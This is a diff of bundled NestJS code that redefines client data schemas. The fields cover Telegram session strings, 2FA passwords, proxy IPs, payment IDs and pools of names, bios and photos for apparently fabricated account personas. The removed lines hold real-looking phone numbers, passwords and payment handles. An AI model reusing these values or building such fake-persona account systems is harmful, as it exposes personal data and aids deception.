-], EnhancedClientSearchResponseDto.prototype, "searchType", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ type: [PromoteMobileMatchDto] }),
-    __metadata("design:type", Array)
-], EnhancedClientSearchResponseDto.prototype, "promoteMobileMatches", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ example: 4 }),
-    __metadata("design:type", Number)
-], EnhancedClientSearchResponseDto.prototype, "totalResults", void 0);
 
 
 /***/ },
@@ -21373,99 +21112,99 @@ class CreateClientDto {
 }
 exports.CreateClientDto = CreateClientDto;
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Channel link' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "channelLink", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Database collection name' }),
+    (0, swagger_1.ApiProperty)({ description: 'Database collection name' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "dbcoll", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Client link' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsUrl)({}, { message: 'Invalid client link format' }),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "link", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'Shruthi Reddy', description: 'Name of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Display name' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "name", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: '+916265240911', description: 'Phone number of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Mobile number' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.Matches)(/^\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' }),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "mobile", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'Ajtdmwajt1@', description: 'Password of the user' }),
+    (0, swagger_1.ApiProperty)({ description: '2FA password' }),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "password", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'tg-aut repl link' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsUrl)({}, { message: 'Invalid repl URL format' }),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "repl", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Promote repl link' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsUrl)({}, { message: 'Invalid promote repl URL format' }),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "promoteRepl", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' }),
+    (0, swagger_1.ApiProperty)({ description: 'Telegram session string' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "session", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Username of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Telegram username' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "username", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Unique client identifier' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsString)(),
     (0, class_validator_1.Matches)(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' }),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "clientId", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' }),
+    (0, swagger_1.ApiProperty)({ description: 'Deploy restart URL' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsUrl)({}, { message: 'Invalid deploy key URL format' }),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "deployKey", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'booklet_10', description: 'Product associated with the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Product identifier' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "product", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Paytm QR ID' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "qrId", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ example: 'myred1808@postbank', description: 'Google Pay ID of the user' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Google Pay ID' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "gpayId", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ example: ['192.168.1.100:8080', '192.168.1.101:8080'], description: 'Dedicated proxy IPs assigned to this client' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Dedicated proxy IPs' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsArray)(),
     (0, class_validator_1.ArrayUnique)(),
@@ -21473,91 +21212,55 @@ __decorate([
     __metadata("design:type", Array)
 ], CreateClientDto.prototype, "dedicatedIps", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ example: 'US', description: 'Preferred country for IP assignment' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Preferred IP country (ISO 2-letter)' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim().toUpperCase()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.Matches)(/^[A-Z]{2}$/, { message: 'preferredIpCountry must be a 2-letter ISO country code' }),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "preferredIpCountry", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ example: true, description: 'Whether to auto-assign IPs to mobile numbers' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Auto-assign IPs to mobile numbers' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_transformer_1.Type)(() => Boolean),
     (0, class_validator_1.IsBoolean)(),
     __metadata("design:type", Boolean)
 ], CreateClientDto.prototype, "autoAssignIps", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Pool of first names', required: false }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'First name pool for persona assignment' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsArray)(),
     (0, class_validator_1.IsString)({ each: true }),
     __metadata("design:type", Array)
 ], CreateClientDto.prototype, "firstNames", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Pool of last names for buffer clients', required: false }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Last name pool for buffer clients' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsArray)(),
     (0, class_validator_1.IsString)({ each: true }),
     __metadata("design:type", Array)
 ], CreateClientDto.prototype, "bufferLastNames", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Pool of last names for promote clients', required: false }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Last name pool for promote clients' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsArray)(),
     (0, class_validator_1.IsString)({ each: true }),
     __metadata("design:type", Array)
 ], CreateClientDto.prototype, "promoteLastNames", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Pool of bios', required: false }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Bio pool' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsArray)(),
     (0, class_validator_1.IsString)({ each: true }),
     __metadata("design:type", Array)
 ], CreateClientDto.prototype, "bios", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Pool of profile pic URLs', required: false }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Profile pic URL pool' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsArray)(),
     (0, class_validator_1.IsString)({ each: true }),
     (0, class_validator_1.IsUrl)({}, { each: true }),
     __metadata("design:type", Array)
 ], CreateClientDto.prototype, "profilePics", void 0);
-
-
-/***/ },
-
-/***/ "./src/components/clients/dto/enhanced-search-client.dto.ts"
-/*!******************************************************************!*\
-  !*** ./src/components/clients/dto/enhanced-search-client.dto.ts ***!
-  \******************************************************************/
-(__unused_webpack_module, exports, __webpack_require__) {
-
-
-var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
-    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
-    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
-    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
-    return c > 3 && r && Object.defineProperty(target, key, r), r;
-};
-var __metadata = (this && this.__metadata) || function (k, v) {
-    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
-};
-Object.defineProperty(exports, "__esModule", ({ value: true }));
-exports.EnhancedSearchClientDto = void 0;
-const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
-const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
-const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
-const search_client_dto_1 = __webpack_require__(/*! ./search-client.dto */ "./src/components/clients/dto/search-client.dto.ts");
-class EnhancedSearchClientDto extends (0, swagger_1.PartialType)(search_client_dto_1.SearchClientDto) {
-}
-exports.EnhancedSearchClientDto = EnhancedSearchClientDto;
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Promote mobile number to search assigned client mappings for.' }),
-    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsString)(),
-    __metadata("design:type", String)
-], EnhancedSearchClientDto.prototype, "promoteMobileNumber", void 0);
 
 
 /***/ },
@@ -21587,18 +21290,18 @@ class ExecuteClientQueryDto {
 }
 exports.ExecuteClientQueryDto = ExecuteClientQueryDto;
 __decorate([
-    (0, swagger_1.ApiProperty)({ type: 'object', additionalProperties: true, example: { clientId: 'client-a' } }),
+    (0, swagger_1.ApiProperty)({ description: 'MongoDB filter object', type: 'object', additionalProperties: true }),
     (0, class_validator_1.IsObject)(),
     __metadata("design:type", Object)
 ], ExecuteClientQueryDto.prototype, "query", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ type: 'object', additionalProperties: true, example: { clientId: 1 } }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Sort specification', type: 'object', additionalProperties: true }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsObject)(),
     __metadata("design:type", Object)
 ], ExecuteClientQueryDto.prototype, "sort", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ example: 20, minimum: 1 }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Max results to return', minimum: 1 }),
     (0, class_validator_1.IsOptional)(),
     (0, class_transformer_1.Type)(() => Number),
     (0, class_validator_1.IsInt)(),
@@ -21606,7 +21309,7 @@ __decorate([
     __metadata("design:type", Number)
 ], ExecuteClientQueryDto.prototype, "limit", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ example: 0, minimum: 0 }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Results to skip', minimum: 0 }),
     (0, class_validator_1.IsOptional)(),
     (0, class_transformer_1.Type)(() => Number),
     (0, class_validator_1.IsInt)(),
@@ -21647,76 +21350,6 @@ __exportStar(__webpack_require__(/*! ./setup-client.dto */ "./src/components/cli
 
 /***/ },
 
-/***/ "./src/components/clients/dto/promote-mobile-assignment.dto.ts"
-/*!*********************************************************************!*\
-  !*** ./src/components/clients/dto/promote-mobile-assignment.dto.ts ***!
-  \*********************************************************************/
-(__unused_webpack_module, exports, __webpack_require__) {
-
-
-var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
-    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
-    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
-    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
-    return c > 3 && r && Object.defineProperty(target, key, r), r;
-};
-var __metadata = (this && this.__metadata) || function (k, v) {
-    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
-};
-Object.defineProperty(exports, "__esModule", ({ value: true }));
-exports.PromoteMobileAssignmentDto = void 0;
-const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
-const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
-const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
-class PromoteMobileAssignmentDto {
-}
-exports.PromoteMobileAssignmentDto = PromoteMobileAssignmentDto;
-__decorate([
-    (0, swagger_1.ApiProperty)({ example: '916265240911' }),
-    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
-    (0, class_validator_1.IsString)(),
-    (0, class_validator_1.Matches)(/^\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' }),
-    __metadata("design:type", String)
-], PromoteMobileAssignmentDto.prototype, "mobileNumber", void 0);
-
-
-/***/ },
-
-/***/ "./src/components/clients/dto/promote-mobile-search-query.dto.ts"
-/*!***********************************************************************!*\
-  !*** ./src/components/clients/dto/promote-mobile-search-query.dto.ts ***!
-  \***********************************************************************/
-(__unused_webpack_module, exports, __webpack_require__) {
-
-
-var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
-    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
-    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
-    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
-    return c > 3 && r && Object.defineProperty(target, key, r), r;
-};
-var __metadata = (this && this.__metadata) || function (k, v) {
-    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
-};
-Object.defineProperty(exports, "__esModule", ({ value: true }));
-exports.PromoteMobileSearchQueryDto = void 0;
-const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
-const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
-const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
-class PromoteMobileSearchQueryDto {
-}
-exports.PromoteMobileSearchQueryDto = PromoteMobileSearchQueryDto;
-__decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Promote mobile number to search for.', example: '916265240911' }),
-    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
-    (0, class_validator_1.IsString)(),
-    (0, class_validator_1.Matches)(/^\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' }),
-    __metadata("design:type", String)
-], PromoteMobileSearchQueryDto.prototype, "mobile", void 0);
-
-
-/***/ },
-
 /***/ "./src/components/clients/dto/search-client.dto.ts"
 /*!*********************************************************!*\
   !*** ./src/components/clients/dto/search-client.dto.ts ***!
@@ -21742,7 +21375,7 @@ class SearchClientDto {
 }
 exports.SearchClientDto = SearchClientDto;
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Client ID of the client' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Client ID' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
@@ -21757,91 +21390,83 @@ __decorate([
     __metadata("design:type", String)
 ], SearchClientDto.prototype, "dbcoll", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Channel link of the client' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Channel link' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], SearchClientDto.prototype, "channelLink", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Link of the client' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Client link' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
     __metadata("design:type", String)
 ], SearchClientDto.prototype, "link", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Name of the client' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Display name' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], SearchClientDto.prototype, "name", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Phone number of the client' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Mobile number' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.Matches)(/^\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' }),
     __metadata("design:type", String)
 ], SearchClientDto.prototype, "number", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Password of the client' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Password' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], SearchClientDto.prototype, "password", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Repl link of the client' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'tg-aut repl link' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
     __metadata("design:type", String)
 ], SearchClientDto.prototype, "repl", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Promotion Repl link of the client' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Promote repl link' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
     __metadata("design:type", String)
 ], SearchClientDto.prototype, "promoteRepl", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Clientname of the client' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Client name' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], SearchClientDto.prototype, "clientName", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Deployment key URL' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Deploy restart URL' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
     __metadata("design:type", String)
 ], SearchClientDto.prototype, "deployKey", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Product associated with the client' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Product identifier' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], SearchClientDto.prototype, "product", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Search by client ID that has promote mobiles assigned' }),
-    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsString)(),
-    (0, class_validator_1.Matches)(/^(true|false)$/i, { message: 'hasPromoteMobiles must be either "true" or "false"' }),
-    __metadata("design:type", String)
-], SearchClientDto.prototype, "hasPromoteMobiles", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Paytm QR ID of the client' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Paytm QR ID' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], SearchClientDto.prototype, "qrId", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Google Pay ID of the client' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Google Pay ID' }),
     (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
@@ -21882,36 +21507,27 @@ class SetupClientQueryDto {
 }
 exports.SetupClientQueryDto = SetupClientQueryDto;
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({
-        type: Number,
-        default: 0
-    }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Days to push availability forward', default: 0 }),
     (0, class_validator_1.IsOptional)(),
     (0, class_transformer_1.Type)(() => Number),
     (0, class_validator_1.IsNumber)(),
     __metadata("design:type", Number)
 ], SetupClientQueryDto.prototype, "days", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({
-        default: true
-    }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Archive the old client back to buffer pool', default: true }),
     (0, class_validator_1.IsOptional)(),
     (0, class_transformer_1.Transform)(toBoolean),
     (0, class_validator_1.IsBoolean)(),
     __metadata("design:type", Boolean)
 ], SetupClientQueryDto.prototype, "archiveOld", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({
-        type: String
-    }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Specific mobile to use as replacement' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], SetupClientQueryDto.prototype, "mobile", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({
-        default: true
-    }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Run privacy/cleanup formalities on old account', default: true }),
     (0, class_validator_1.IsOptional)(),
     (0, class_transformer_1.Transform)(toBoolean),
     (0, class_validator_1.IsBoolean)(),
@@ -22045,117 +21661,117 @@ let Client = class Client {
 };
 exports.Client = Client;
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Channel link' }),
     (0, mongoose_1.Prop)({ required: true }),
     __metadata("design:type", String)
 ], Client.prototype, "channelLink", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Database collection name' }),
+    (0, swagger_1.ApiProperty)({ description: 'Database collection name' }),
     (0, mongoose_1.Prop)({ required: true }),
     __metadata("design:type", String)
 ], Client.prototype, "dbcoll", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Client link' }),
     (0, mongoose_1.Prop)({ required: true }),
     __metadata("design:type", String)
 ], Client.prototype, "link", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'Shruthi Reddy', description: 'Name of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Display name' }),
     (0, mongoose_1.Prop)({ required: true }),
     __metadata("design:type", String)
 ], Client.prototype, "name", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: '916265240911', description: 'mobile number of the user' }),
-    (0, mongoose_1.Prop)({ required: true }),
+    (0, swagger_1.ApiProperty)({ description: 'Mobile number' }),
+    (0, mongoose_1.Prop)({ required: true, unique: true }),
     __metadata("design:type", String)
 ], Client.prototype, "mobile", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'Ajtdmwajt1@', description: 'Password of the user' }),
+    (0, swagger_1.ApiProperty)({ description: '2FA password' }),
     (0, mongoose_1.Prop)({ required: true }),
     __metadata("design:type", String)
 ], Client.prototype, "password", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'tg-aut repl link' }),
     (0, mongoose_1.Prop)({ required: true }),
     __metadata("design:type", String)
 ], Client.prototype, "repl", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Promote repl link' }),
     (0, mongoose_1.Prop)({ required: true }),
     __metadata("design:type", String)
 ], Client.prototype, "promoteRepl", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuM==', description: 'Session token' }),
+    (0, swagger_1.ApiProperty)({ description: 'Telegram session string' }),
     (0, mongoose_1.Prop)({ required: true }),
     __metadata("design:type", String)
 ], Client.prototype, "session", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Username of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Telegram username' }),
     (0, mongoose_1.Prop)({ required: true }),
     __metadata("design:type", String)
 ], Client.prototype, "username", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID of the user' }),
-    (0, mongoose_1.Prop)({ required: true }),
+    (0, swagger_1.ApiProperty)({ description: 'Unique client identifier' }),
+    (0, mongoose_1.Prop)({ required: true, unique: true }),
     __metadata("design:type", String)
 ], Client.prototype, "clientId", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' }),
+    (0, swagger_1.ApiProperty)({ description: 'Deploy restart URL' }),
     (0, mongoose_1.Prop)({ required: true }),
     __metadata("design:type", String)
 ], Client.prototype, "deployKey", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'booklet_10', description: 'Product associated with the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Product identifier' }),
     (0, mongoose_1.Prop)({ required: true }),
     __metadata("design:type", String)
 ], Client.prototype, "product", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Paytm QR ID' }),
     (0, mongoose_1.Prop)({ required: true }),
     __metadata("design:type", String)
 ], Client.prototype, "qrId", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'myred1808@postbank', description: 'Google Pay ID of the user' }),
+    (0, swagger_1.ApiProperty)({ description: 'Google Pay ID' }),
     (0, mongoose_1.Prop)({ required: true }),
     __metadata("design:type", String)
 ], Client.prototype, "gpayId", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: ['192.168.1.100:8080', '192.168.1.101:8080'], description: 'Dedicated proxy IPs assigned to this client' }),
+    (0, swagger_1.ApiProperty)({ description: 'Dedicated proxy IPs', required: false }),
     (0, mongoose_1.Prop)({ required: false, type: [String], default: [] }),
     __metadata("design:type", Array)
 ], Client.prototype, "dedicatedIps", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: 'US', description: 'Preferred country for IP assignment', required: false }),
+    (0, swagger_1.ApiProperty)({ description: 'Preferred IP country (ISO 2-letter)', required: false }),
     (0, mongoose_1.Prop)({ required: false, default: null }),
     __metadata("design:type", String)
 ], Client.prototype, "preferredIpCountry", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ example: true, description: 'Whether to auto-assign IPs to mobile numbers', required: false }),
+    (0, swagger_1.ApiProperty)({ description: 'Auto-assign IPs to mobile numbers', required: false }),
     (0, mongoose_1.Prop)({ required: false, type: Boolean, default: false }),
     __metadata("design:type", Boolean)
